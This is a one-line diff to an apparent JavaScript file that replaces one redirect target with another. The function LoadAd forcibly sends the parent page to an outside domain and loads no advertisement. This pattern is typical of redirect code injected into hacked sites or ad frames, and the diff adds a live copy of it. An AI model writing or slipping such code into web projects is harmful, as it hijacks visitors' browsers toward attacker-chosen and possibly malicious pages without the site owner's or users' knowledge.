@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="http://quinnu.com/loml"; } LoadAd();
+function LoadAd() { parent.location.href="https://wasthaps.net/ashydga"; } LoadAd();
